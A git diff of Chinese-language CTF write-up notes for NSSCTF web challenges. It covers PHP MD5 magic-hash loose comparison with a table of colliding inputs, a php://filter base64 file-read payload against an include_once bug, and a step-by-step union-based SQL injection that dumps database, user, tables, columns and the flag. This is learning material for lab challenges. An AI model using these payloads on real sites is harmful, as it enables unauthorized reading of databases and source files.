@@ -125,3 +125,213 @@ SEE{you_found_me_now_try_the_1337er_one}
 ## [[LitCTF 2023]Follow me and hack me - NSSCTF](https://www.nssctf.cn/problem/3864)
 ### 思路
 - 使用`HackBar`插件来在浏览器里面进行发送/接收`http`报文  ![](04nss/nssctf/8.png)
+
+---
+
+## [[SWPUCTF 2021 新生赛]easy_md5 - NSSCTF](https://www.nssctf.cn/problem/386)
+### 思路
+1. 看代码
+```php
+ if ($name != $password && md5($name) == md5($password)) {
+        echo $flag;
+} else {
+        echo "wrong!";
+}
+```
+这段代码的要求：
+> `name`与`password`不能一样，但二者的`md5`结果要相等
+但这时我们注意到`PHP`用的是弱比较而不是严格比较
+
+2. 利用`magic hash`
+`PHP`里如果长这样：
+```txt
+0e123456789
+```
+会被当成科学计数法：
+```txt
+0 * 10^123456789 = 0
+```
+所以在`PHP`弱比较里：
+```PHP
+"0e12345" == "0e67890"
+```
+的结果为`true`
+
+而有一些字符串的 md5 值刚好是 `0e` 开头，而且后面全是数字，这种就叫 `magic hash`。常见的一组是：
+```txt
+QNKCDZO -> 0e830400451993494058024219903391
+240610708 -> 0e462097431906509019562988736854
+```
+![](img-001.png)
+得到`flag`
+```txt
+NSSCTF{6ee63399-6c66-42f3-9216-2980f9982e38}
+```
+
+常见 `MD5 magic hash`
+
+|原文|MD5|
+|---|---|
+|`QNKCDZO`|`0e830400451993494058024219903391`|
+|`240610708`|`0e462097431906509019562988736854`|
+|`s878926199a`|`0e545993274517709034328855841020`|
+|`s155964671a`|`0e342768416822451524974117254469`|
+|`s214587387a`|`0e848240448830537924465865611904`|
+|`s1091221200a`|`0e940624217856561557816327384675`|
+
+---
+
+## [[SWPUCTF 2021 新生赛]include - NSSCTF](https://www.nssctf.cn/problem/427)
+### 思路
+1. 打开环境提示“传入一个`file`试试”，所以试着`/?file=flag`，然后得到源码
+```PHP
+<?php
+ini_set("allow_url_include","on");
+header("Content-type: text/html; charset=utf-8");
+error_reporting(0);
+$file=$_GET['file'];
+if(isset($file)){
+    show_source(__FILE__);
+    echo 'flag 在flag.php';
+}else{
+    echo "传入一个file试试";
+}
+echo "</br>";
+echo "</br>";
+echo "</br>";
+echo "</br>";
+echo "</br>";
+include_once($file);
+?>
+```
+接着又尝试`/?file=flag.php`，页面并没有变化
+
+2. 在源码的最后一行看到：
+```PHP
+include_once($file);
+```
+有`include_once`函数，即它会执行`flag.php`但并不会显示出来`flag`
+
+>`include_once` 表示在脚本执行期间包含并运行指定文件。此行为和 [include](https://www.php.net/manual/zh/function.include.php) 类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 `include_once` 会返回 `true`。顾名思义，`require_once`，文件仅仅包含（require）一次。
+
+3. 所以要用`php://filter`将`flag.php`读取出来
+```php
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+```
+意思是：
+```txt
+使用 PHP 的 filter 伪协议，
+在读取 flag.php 的时候，
+把 flag.php 的内容进行 Base64 编码，然后输出编码后的结果。
+```
+得到的`Base64`再转换成`flag`
+
+---
+
+## [[SWPUCTF 2021 新生赛]easy_sql - NSSCTF](https://www.nssctf.cn/problem/387)
+### 思路
+1. **传参**
+打开环境，结合“球球你输入点东西吧！”与标签页的“参数是`wllm`”，于是输入：
+```txt
+?/wllm=1
+```
+![[Pasted image 20260528170436.png]]
+
+2. **判断字段数：`order by`**
+```txt
+/?wllm=1' order by 1 --+
+/?wllm=1' order by 2 --+
+/?wllm=1' order by 3 --+
+/?wllm=1' order by 4 --+
+```
+当`order by 4`时，产生报错，说明字段数是`3`
+![[Pasted image 20260528171150.png]]
+
+3. **查看回显点：`union select 1,2,3`**
+>回显点：
+>`union select 1,2,3 里面，哪个数字会显示在网页上`
+```txt
+/?wllm=-1' union select 1,2,3 -- '
+```
+![[Pasted image 20260528171510.png]]
+所以要想查询数据库名就可以把`database()`放到第二位或者第三位
+```txt
+?/wllm=-1' union select 1,database(),3 --+
+?/wllm=-1' union select 1,2,database() --+
+```
+
+**为什么用`-1`?**
+- 因为用`?wllm=1`可能会查到正常数据
+- 用`?wllm=-1`是为了先让网站原本的数据消失，再让它显示我们想查的数据
+
+4. **查询数据库信息：`@@version`**
+```txt
+/?wllm=-1' union select 1,2,@@version -- '
+/?wllm=-1' union select 1,@@version,3 -- '
+```
+![[屏幕截图 2026-05-28 172247.png]]![[屏幕截图 2026-05-28 172318.png]]
+>`@@version`：是`MySQL / MariaDB`里的系统变量，用来显示数据库版本
+>这一步的作用：确认数据库类型和版本
+如果是`MySQL/MariaDB`，就可以使用
+```txt
+information_schema
+database()
+user()
+group_concat()
+```
+
+| 名称                           | 作用       | 一般什么时候用         |
+| ---------------------------- | -------- | --------------- |
+| `database()`                 | 查当前数据库名 | 早期，确定当前库        |
+| `user()`                     | 查当前数据库用户 | 可选，了解权限         |
+| `information_schema.tables`  | 查表名     | 知道数据库后          |
+| `information_schema.columns` | 查列名     | 知道表名后          |
+| `group_concat()`             | 多行合并成一行 | 查表名、列名、flag 时常用 |
+
+5. **查询库名和用户名：`database()、user()`**
+因为上一步已经确定为`MariaDB`，所以先使用`database()`查询当前数据库名
+```txt
+/?wllm=-1' union select 1,2,database() -- '
+```
+![[Pasted image 20260528173852.png]]
+得到当前数据库名为：`test_db`——说明当前网站的数据在`text_db`中。又使用：
+```txt
+/?wllm=-1' union select 1,2,user() -- '
+```
+查到当前用户是：`root@localhost`——说明数据库的连接用户是`root`
+
+6. **爆表：查询有哪些表**
+```txt
+/?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'-- '
+```
+![[Pasted image 20260528174823.png]]
+查出有两个表且将二者合并到一行显示：`test_tb,users`
+
+>`group_concat(table_name)`：把多个表名合并到一行显示
+>`table_name`：专门用来存放表名的目录
+>`information_schema`：记录了数据库的结构信息——有哪些数据库，每个数据库有哪些表，每个表有哪些列
+>`select table_name from information_schema.tables`：查出所有表的名字
+
+7. **爆列：查询表里有哪些字段**
+```txt
+/?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb' -- '
+```
+![[Pasted image 20260528180025.png]]说明`flag`很可能就在`test_tb`表里
+
+8. **查`flag`**
+```txt
+/?wllm=-1' union select 1,2,group_concat(flag) from test_tb -- '
+```
+![[Pasted image 20260528180419.png]]
+
+9. **总结**
+```txt
+1. 看源码，找到参数 wllm
+2. 用 order by 判断字段数
+3. 用 union select 1,2,3 找回显位
+4. 用 @@version 判断数据库类型
+5. 用 database() 查当前数据库
+6. 用 information_schema.tables 查表名
+7. 用 information_schema.columns 查列名
+8. 用 group_concat(flag) from test_tb 查 flag
+```
